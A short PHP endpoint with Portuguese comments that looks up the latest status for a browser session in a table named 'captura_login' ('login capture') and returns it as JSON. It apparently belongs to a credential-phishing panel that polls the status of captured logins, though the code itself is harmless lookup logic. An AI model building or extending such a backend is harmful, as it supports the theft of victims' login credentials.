<?php
header('Content-Type: application/json');
require_once __DIR__ . '/db.php'; // Conexão com o banco

// 1. Identifica o usuário pelo cookie
$session_id = $_COOKIE['identificador_cliente'] ?? null;
if (!$session_id) {
    echo json_encode(['status' => 'sessao_invalida']);
    exit;
}

try {
    // 2. Busca APENAS o status do registro mais recente para esta sessão
    $sql = "SELECT status FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1";
    $stmt = $pdo->prepare($sql);
    $stmt->execute([$session_id]);
    
    $result = $stmt->fetch(PDO::FETCH_ASSOC);

    // 3. Retorna o status encontrado ou 'nao_encontrado'
    if ($result) {
        echo json_encode(['status' => $result['status']]);
    } else {
        echo json_encode(['status' => 'nao_encontrado']);
    }

} catch (PDOException $e) {
    error_log('Erro na API de verificação de status: ' . $e->getMessage());
    http_response_code(500);
    echo json_encode(['status' => 'erro_servidor']);
}
?>